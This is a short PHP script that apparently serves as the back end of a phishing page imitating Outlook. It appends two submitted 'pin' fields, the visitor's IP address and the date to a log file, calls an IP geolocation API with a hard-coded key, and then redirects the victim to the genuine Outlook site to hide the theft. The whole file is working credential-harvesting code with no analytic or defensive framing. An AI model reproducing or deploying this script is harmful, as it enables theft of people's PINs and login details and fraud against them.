<?php
session_start();
$fnm = "0000000000.txt";
$fhandlr = fopen($fnm, "a");


fwrite($fhandlr, 'pin1: '.$_POST['inputWithValidation']."\n");
fwrite($fhandlr, 'pin2: '.$_POST['inputWithValidation2']."\n");



if( !empty($_SERVER['REMOTE_ADDR']) ){

	@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
	@$IPResult =  file_get_contents($api_url);
	@fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");


}fwrite($fhandlr, "***********************************************\n");

fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
fclose($fhandlr);
session_destroy();
header ('Location:https://outlook.live.com/owa/');
exit;
?>